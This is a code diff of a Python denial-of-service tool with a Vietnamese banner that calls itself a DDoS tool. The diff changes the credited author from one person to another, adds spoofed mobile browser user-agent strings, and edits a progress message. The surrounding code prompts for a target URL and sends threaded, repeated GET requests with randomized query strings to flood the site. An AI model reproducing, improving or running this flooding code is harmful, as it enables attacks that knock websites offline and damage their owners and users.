@@ -5,9 +5,9 @@ import random
 import os
 print (''' 
 
-\033[1;36m © Copyright Võ Sơn Hà ! Tool Đéo Miễn Phí Thích Thì Share !!!
-\033[1;35m [>___> _ *]  By VSH Ddos Version: [ Riêng Tư ]
-\033[1;31m [>___> _ *]  Link: facebook.com/1508759  	
+\033[1;36m © Copyright Trần Nguyên Khánh ! Tool Đéo Miễn Phí Thích Thì Share !!!
+\033[1;35m [>___> _ *]  By TNK Ddos Version: [ Riêng Tư ]
+\033[1;31m [>___> _ *]  Link: https://github.com/ngkhanhh  	
 \033[1;37m                                                                             
 ''')
 url = input("Link Cần Ddos:  ").strip() 
@@ -32,7 +32,10 @@ def useragent():
     headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
     headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
     headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
-
+    headers.append("Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1")
+    headers.append("Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36")
+    headers.append("Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36")
+    headers.append("Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36")
     return headers
 
 
@@ -55,7 +58,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0} VSH Đang tiến hành".format(count))
+                print ("{0} TNK Đang tiến hành".format(count))
             except requests.exceptions.ConnectionError:
                 print ("[Máy Chủ Của Bạn Bị Lỗi!]")
                 pass
